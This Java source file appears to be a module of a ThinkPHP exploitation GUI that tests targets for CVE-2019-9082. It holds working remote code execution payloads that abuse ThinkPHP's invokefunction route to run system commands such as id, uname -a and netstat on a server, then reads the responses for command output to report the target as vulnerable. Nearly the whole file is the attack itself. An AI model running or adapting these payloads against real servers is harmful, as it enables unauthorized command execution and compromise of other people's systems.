package exploit;

import com.example.thinkphpgui.ConfigManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.stream.Stream;
import com.example.thinkphpgui.Exploit;
import com.example.thinkphpgui.utils.HttpRequestUtil;

public class Tp_CVE_2019_9082 implements Exploit{
    ConfigManager configManager=ConfigManager.getInstance();
    private final List<String> payloadList=new ArrayList<>(Arrays.asList(
            "/\\think\\app/invokefunction&function=phpinfo&vars[0]=100",
            "/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=uname%20-a",
            "/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
            "/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat",
            "/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir",
            "/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id",
            "/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=netstat",
            "/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=dir"

    ));
    @Override
    public void startScan(String url){

        verify(url);

    }
    public void verify(String url){
        Boolean isVulerable=false;
        for(String module:ConfigManager.moduleList){
            for(String payload:payloadList){
                String targetUrl=url+"?s="+module+payload;
                try{
                    HttpURLConnection httpURLConnection= HttpRequestUtil.get(targetUrl);
                    BufferedReader bufferedReader;
                    if(httpURLConnection.getResponseCode()>=400){
                        bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getErrorStream()));
                    }else{
                        bufferedReader=new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    }
                    String line;
                    while((line=bufferedReader.readLine())!=null){

                        if(Stream.of("PHP Version","PHP Core", "PHP Variables", "PHP License","uid=", "groups=","gid=","x86_64", "i686", "i386", "ESTABLISHED","CLOSE_WAIT","LAST_ACK","TIME_WAIT","GNU/Linux","<DIR>").anyMatch(line::contains)){
                            configManager.appendToTextArea("[+] "+url+"   存在CVE-2019-9082   "+targetUrl);
                            isVulerable=true;
                            break;
                        }
                    }

                }catch (Exception e){
                    System.out.println(e.getMessage());
                }
            }
        }

        if(!isVulerable){
            configManager.appendToTextArea("[-] "+url+"   不存在CVE-2019-9082");
        }
    }
}
